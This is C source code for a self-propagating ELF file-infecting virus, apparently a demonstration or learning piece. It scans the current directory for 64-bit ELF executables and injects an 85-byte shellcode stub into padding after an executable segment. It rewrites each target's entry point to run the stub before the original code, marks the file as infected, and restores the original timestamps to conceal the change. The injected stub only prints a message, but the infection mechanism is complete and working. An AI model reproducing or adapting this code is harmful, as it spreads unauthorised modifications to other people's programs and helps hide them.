#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <utime.h>

static unsigned char infection[85] = {
    0x50, 0x57, 0x56, 0x52, 0x48, 0x31, 0xff, 0x40, 0xb7, 0x01, 0x48, 0x31, 0xc0, 0xb0, 0x01, 0x48,
    0x31, 0xf6, 0x48, 0xbe, 0x75, 0x73, 0x20, 0x3b, 0x2d, 0x29, 0x21, 0x0a, 0x56, 0x48, 0xbe, 0x20,
    0x65, 0x6c, 0x66, 0x20, 0x76, 0x69, 0x72, 0x56, 0x48, 0xbe, 0x20, 0x49, 0x20, 0x61, 0x6d, 0x20,
    0x61, 0x6e, 0x56, 0x48, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x48, 0x65, 0x79, 0x21, 0x56, 0x48, 0x89,
    0xe6, 0x48, 0x31, 0xd2, 0xb2, 0x20, 0x0f, 0x05, 0x5e, 0x5e, 0x5e, 0x5e, 0x5a, 0x5e, 0x5f, 0x58,
    0xe9, 0x00, 0x00, 0x00, 0x00};
const long unsigned int youWasHacked = 0xfeaffeaffeaffeaf;

static int readFileNamesInDir(char* inDir, char* ownFileName);
static int elfCheckFile(Elf64_Ehdr* hdr);
static int elfCheck64Bit(Elf64_Ehdr* hdr);
static int checkIfChangeNeeded(FILE* entry_file, char* targetFileName);
static int writeToElf(char* targetFileName);
static int findInfectionPhdr(Elf64_Phdr const* phdr, int count);
static void* mapFile(char const* filename, size_t* psize, struct utimbuf* utimbuf);

int main(int argc, char** argv) {
  return readFileNamesInDir("./", argv[0]);
}

static int readFileNamesInDir(char* inDir, char* ownFileName) {
  if (ownFileName[0] == '.' && ownFileName[1] == '/')
    ownFileName += 2;
  DIR* fd = opendir(inDir);
  if (NULL != fd) {
    struct dirent* in_file;
    while (in_file = readdir(fd)) {
      if (!strcmp(in_file->d_name, "."))
        continue;
      if (!strcmp(in_file->d_name, ".."))
        continue;
      if (!strcmp(in_file->d_name, ownFileName))
        continue;
      FILE* entry_file = fopen(in_file->d_name, "rwb+");
      if (entry_file != NULL) {
        Elf64_Ehdr ehdr;
        if (fread(&ehdr, sizeof(ehdr), 1, entry_file) == 1) {
          if (elfCheckFile(&ehdr) && elfCheck64Bit(&ehdr) && ehdr.e_entry != 0)
            if (checkIfChangeNeeded(entry_file, in_file->d_name) == 0)
              break;
        }
        fclose(entry_file);
      }
    }
  }
  return 0;
}

static int elfCheckFile(Elf64_Ehdr* hdr) {
  if (!hdr) return 0;
  if (hdr->e_ident[EI_MAG0] != ELFMAG0) return 0;
  if (hdr->e_ident[EI_MAG1] != ELFMAG1) return 0;
  if (hdr->e_ident[EI_MAG2] != ELFMAG2) return 0;
  if (hdr->e_ident[EI_MAG3] != ELFMAG3) return 0;
  return 1;
}

static int elfCheck64Bit(Elf64_Ehdr* hdr) {
  if (!hdr) return 0;
  if (hdr->e_ident[EI_CLASS] != ELFCLASS64) return 0;
  return 1;
}

static int checkIfChangeNeeded(FILE* entry_file, char* targetFileName) {
  long unsigned int youHackedCheck;
  fseek(entry_file, 0L - sizeof(youWasHacked), SEEK_END);
  fread(&youHackedCheck, sizeof youWasHacked, 1, entry_file);
  if (youHackedCheck != youWasHacked) {
    int res = writeToElf(targetFileName);
    fseek(entry_file, 0L - sizeof(youWasHacked), SEEK_END);
    fwrite(&youWasHacked, sizeof youWasHacked, 1, entry_file);
    return res;
  } else
    return 1;
}

static int writeToElf(char* targetFileName) {
  struct utimbuf timestamps;
  size_t filesize;
  char* image = mapFile(targetFileName, &filesize, &timestamps);
  if (image != NULL) {
    Elf64_Ehdr* ehdr = (Elf64_Ehdr*)image;
    int elf_section_text = -1;
    Elf64_Phdr* phdr = (Elf64_Phdr*)(image + ehdr->e_phoff);
    elf_section_text = findInfectionPhdr(phdr, ehdr->e_phnum);
    if (elf_section_text > 0 && (phdr[elf_section_text].p_offset + phdr[elf_section_text].p_filesz) < filesize) {
      Elf64_Off virus_include_position = phdr[elf_section_text].p_vaddr + phdr[elf_section_text].p_filesz;
      off_t virus_include_position_offset = virus_include_position + sizeof infection;
      off_t virus_callback_offset = ehdr->e_entry - (virus_include_position + sizeof infection);
      if (!(virus_callback_offset > 0x7FFFFFFFL || virus_callback_offset < -0x80000000L)) {
        *(Elf64_Word*)(infection + sizeof infection - 4) = (Elf64_Word)virus_callback_offset;
        ehdr->e_entry = virus_include_position;
        memcpy(image + phdr[elf_section_text].p_offset + phdr[elf_section_text].p_filesz,
               infection, sizeof infection);
        phdr[elf_section_text].p_filesz += sizeof infection;
        phdr[elf_section_text].p_memsz += sizeof infection;
        utime(targetFileName, &timestamps);
        return 0;
      }
    }
  }
  return 1;
}

static int findInfectionPhdr(Elf64_Phdr const* phdr, int count) {
  int j;
  for (int i = 0; i < count; ++i)
    if (phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz && (phdr[i].p_flags & PF_X)) {
      Elf64_Off pos = phdr[i].p_offset + phdr[i].p_filesz;
      Elf64_Off endpos = pos + sizeof infection;
      for (j = 0; j < count; ++j)
        if (phdr[j].p_offset >= pos && phdr[j].p_offset < endpos && phdr[j].p_filesz > 0)
          break;
      if (j == count)
        return i;
    }
  return -1;
}

static void* mapFile(char const* filename, size_t* psize, struct utimbuf* utimbuf) {
  struct stat stat;
  int fd = open(filename, O_RDWR);
  fstat(fd, &stat);
  S_ISREG(stat.st_mode);
  void* ptr = mmap(NULL, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (ptr == MAP_FAILED)
    return NULL;
  if (psize)
    *psize = (size_t)stat.st_size;
  if (utimbuf) {
    utimbuf->actime = stat.st_atime;
    utimbuf->modtime = stat.st_mtime;
  }
  return ptr;
}